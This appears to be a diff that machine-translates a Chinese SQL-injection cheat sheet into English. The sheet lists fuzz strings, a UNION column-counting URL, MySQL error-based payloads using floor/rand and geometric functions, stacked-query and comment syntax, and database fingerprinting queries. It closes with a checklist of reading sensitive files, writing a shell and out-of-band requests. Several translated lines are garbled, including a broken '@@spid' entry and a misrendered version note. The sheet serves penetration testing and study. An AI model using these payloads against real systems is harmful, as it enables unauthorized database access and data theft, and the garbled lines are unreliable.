@@ -1,13 +1,13 @@
-注入检测
+Injection detection
 =====================================
 
-常见的注入点
+Common injection points
 --------------------------------------
-- GET/POST/PUT/DELETE参数
+- GET/POST/PUT/DELETE parameters
 - X-Forwarded-For
-- 文件名
+- file name
 
-Fuzz注入点
+Fuzz Injection Point
 --------------------------------------
 - ``'`` / ``"``
 - ``1/1``
@@ -18,25 +18,25 @@ Fuzz注入点
 - ``or 1=1``
 - ``or 1=``
 - ``' and '1'='1``
-- ``+`` ``-`` ``^`` ``*`` ``%`` ``/`` 
+- ``+`` ``-`` ``^`` ``*`` ``%`` ``/``
 - ``<<`` ``>>`` ``||`` ``|`` ``&`` ``&&``
 - ``~``
 - ``!``
 - ``@``
-- 反引号执行
+- Backtick execution
 
-测试用常量
+Test constants
 --------------------------------------
 - ``@@version``
 - ``@@servername``
 - ``@@language``
-- ``@@spid``
+- `` @@ spid`is
 
-测试列数
+Number of test columns
 --------------------------------------
-例如 ``http://www.foo.com/index.asp?id=12+union+select+null,null--`` ，不断增加 ``null`` 至不返回
+For example ``http://www.foo.com/index.asp?id=12+union+select+null,null--``, increasing ``null`` to not return
 
-报错注入
+Report an error injection
 --------------------------------------
 - ``select 1/0``
 - ``select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a``
@@ -46,7 +46,7 @@ Fuzz注入点
 - ``ST_LatFromGeoHash((select * from(select * from(select user())a)b))``
 - ``GTID_SUBSET(version(), 1)``
 
-基于geometric的报错注入
+Error injection based on geometric
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - ``GeometryCollection((select * from (select * from(select user())a)b))``
 - ``polygon((select * from(select * from(select user())a)b))``
@@ -55,15 +55,15 @@ Fuzz注入点
 - ``LINESTRING((select * from(select * from(select user())a)b))``
 - ``multipolygon((select * from(select * from(select user())a)b))``
 
-其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 `commit 95825f <https://github.com/mysql/mysql-server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04>`_ 。
+It should be noted that the error injection based on exp function in the version after MySQL 5.5.49 is no longer effective. For details, please refer to this `commit 95825f <https://github.com/mysql/mysql-server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04 >`_ .
 
-而以上列表中基于geometric的报错注入在这个 `commit 5caea4 <https://github.com/mysql/mysql-server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978>`_ 中被修复，在5.5.x较后的版本中同样不再生效。
+The geometric-based error injection in the above list was fixed in this `commit 5caea4 <https://github.com/mysql/mysql-server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978>`_, and it is also not in the later versions of 5.5.x Re-effective.
 
-堆叠注入
+Stacked Injection
 --------------------------------------
 - ``;select 1``
 
-注释符
+Comment characters
 --------------------------------------
 - ``#``
 - ``--+``
@@ -71,33 +71,33 @@ Fuzz注入点
 - ``/*!xxx*/``
 - ``/*!50000xxx*/``
 
-判断过滤规则
+Judgment filtering rules
 --------------------------------------
-- 是否有trunc
-- 是否过滤某个字符
-- 是否过滤关键字
-- slash和编码
+- Is there any trunc
+- Whether to filter a character
+- Whether to filter keywords
+- slash and encoding
 
-获取信息
+Get information
 --------------------------------------
-- 判断数据库类型
-    - ``and exists (select * from msysobjects ) > 0`` access数据库
-    - ``and exists (select * from sysobjects ) > 0`` SQLServer数据库
+- Determine database type
+- ``and exists (select * from msysobjects ) > 0`` access database
+- ``and exists (select * from sysobjects ) > 0`` SQLServer database
 
-- 判断数据库表
-    - ``and exsits (select * from admin)``
+- Judgment database tables
+- ``and exsits (select * from admin)``
 
-- 版本、主机名、用户名、库名
-- 表和字段
-    - 确定字段数
-        - Order By
-        - Select Into
-    - 表名、列名
+- Version, host name, user name, library name
+- Tables and fields
+- Determine the number of fields
+- Order By
+- Select Into
+- Table name, column name
 
-测试权限
+Test permissions
 --------------------------------------
-- 文件操作
-    - 读敏感文件
-    - 写shell
-- 带外通道
-    - 网络请求
+- File Operation
+- Read sensitive files
+- Write shell
+- Out-of-band channel
+- Network Request
